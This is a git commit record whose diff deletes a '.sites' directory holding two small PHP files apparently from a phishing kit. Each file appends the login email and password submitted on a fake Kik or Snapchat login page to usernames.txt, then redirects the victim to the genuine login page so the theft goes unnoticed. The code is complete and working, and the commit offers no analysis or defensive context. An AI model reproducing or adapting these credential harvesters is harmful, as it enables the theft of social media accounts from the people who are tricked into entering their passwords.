d4f221137d5a71fa900292a6dfa71946db40f41c
AntikyLmao <115337339+AntikyLmao@users.noreply.github.com>
2022-10-07 23:11:13 -0700

    Delete .sites directory

--- .sites/kik_main/login.php
+++
@@ -1,6 +0,0 @@
-<?php
-
-file_put_contents("usernames.txt", "Kik Username: " . $_POST['login_email'] . " Pass: " . $_POST['login_pass'] . "\n", FILE_APPEND);
-header('Location: https://www.kik.com/login/');
-exit();
-?>
--- .sites/sc/process.php
+++
@@ -1,6 +0,0 @@
-<?php
-
-file_put_contents("usernames.txt", "Sc Username: " . $_POST['login_email'] . " Pass: " . $_POST['login_pass'] . "\n", FILE_APPEND);
-header('Location: https://accounts.snapchat.com/accounts/login');
-exit();
-?>
